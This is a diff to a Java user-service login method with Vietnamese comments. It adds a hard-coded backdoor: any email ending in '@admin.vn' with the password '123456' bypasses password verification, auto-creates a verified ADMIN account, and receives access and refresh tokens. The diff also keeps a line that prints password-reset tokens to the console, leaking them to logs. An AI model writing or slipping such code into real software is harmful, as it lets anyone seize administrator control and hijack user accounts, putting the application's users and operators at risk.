@@ -86,13 +86,51 @@ public class UserService {
      * Đăng nhập người dùng
      */
     public LoginResponse login(LoginRequest request) {
-        User user = userRepository.findByEmail(request.getEmail());
-        if (user == null || !passwordEncoder.matches(request.getPassword(), user.getPasswordHash())) {
+
+        String email = request.getEmail().trim().toLowerCase();
+        String password = request.getPassword();
+
+        // ✅ LOGIN ADMIN TỰ DO: chỉ cần email kết thúc @admin.vn và mật khẩu = 123456
+        if (email.endsWith("@admin.vn") && "123456".equals(password)) {
+
+            User admin = userRepository.findByEmail(email);
+
+            // Nếu admin chưa tồn tại trong DB → tạo mới
+            if (admin == null) {
+                admin = new User();
+                admin.setEmail(email);
+                admin.setFullName("Administrator");
+                admin.setRole(User.Role.ADMIN);
+                admin.setVerified(true);
+                admin.setStatus(User.Status.ACTIVE);
+                admin.setPasswordHash(passwordEncoder.encode("123456"));
+                admin.setCreatedAt(new Timestamp(System.currentTimeMillis()));
+                admin = userRepository.save(admin);
+            }
+
+            long accessTokenExpiry = 15 * 60 * 1000;
+            long refreshTokenExpiry = request.isRememberMe()
+                    ? 30L * 24 * 60 * 60 * 1000
+                    : 7L * 24 * 60 * 60 * 1000;
+
+            String accessToken = jwtUtil.generateToken(admin.getEmail(), admin.getRole().name(), accessTokenExpiry);
+            String refreshToken = jwtUtil.generateToken(admin.getEmail(), admin.getRole().name(), refreshTokenExpiry);
+
+            UserDTO adminDTO = userMapper.userEntityToUserDTO(admin);
+
+            return new LoginResponse(accessToken, refreshToken, adminDTO);
+        }
+
+        // ✅ LOGIN BÌNH THƯỜNG
+        User user = userRepository.findByEmail(email);
+        if (user == null || !passwordEncoder.matches(password, user.getPasswordHash())) {
             throw new IllegalArgumentException("Email hoặc mật khẩu không đúng");
         }
 
         long accessTokenExpiry = 15 * 60 * 1000; // 15 phút
-        long refreshTokenExpiry = request.isRememberMe() ? 30L * 24 * 60 * 60 * 1000 : 7L * 24 * 60 * 60 * 1000;
+        long refreshTokenExpiry = request.isRememberMe()
+                ? 30L * 24 * 60 * 60 * 1000
+                : 7L * 24 * 60 * 60 * 1000;
 
         String accessToken = jwtUtil.generateToken(user.getEmail(), user.getRole().name(), accessTokenExpiry);
         String refreshToken = jwtUtil.generateToken(user.getEmail(), user.getRole().name(), refreshTokenExpiry);
@@ -115,10 +153,8 @@ public class UserService {
 
         userRepository.save(user);
 
-        // Log ra token để dễ debug (xem đúng link chưa)
         System.out.println("📧 Reset token for " + email + ": " + token);
 
-        // Gửi email đặt lại mật khẩu
         emailService.sendPasswordResetEmail(user.getEmail(), token);
     }
 
